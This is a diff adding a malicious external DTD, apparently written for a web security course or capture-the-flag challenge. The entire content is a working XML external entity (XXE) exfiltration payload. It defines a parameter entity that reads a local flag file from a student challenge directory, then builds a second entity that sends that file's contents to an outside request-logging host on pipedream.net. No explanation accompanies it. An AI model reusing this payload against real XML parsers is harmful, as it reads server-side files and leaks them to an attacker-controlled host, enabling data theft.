@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///var/websec/wwwstudent_12/level01/venv/lib/python3.8/site-packages/social/admin_assets/flag.txt">
+<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'https://en6w09e15swm6.x.pipedream.net/?x=%file;'>">
+%eval;
+%exfiltrate;
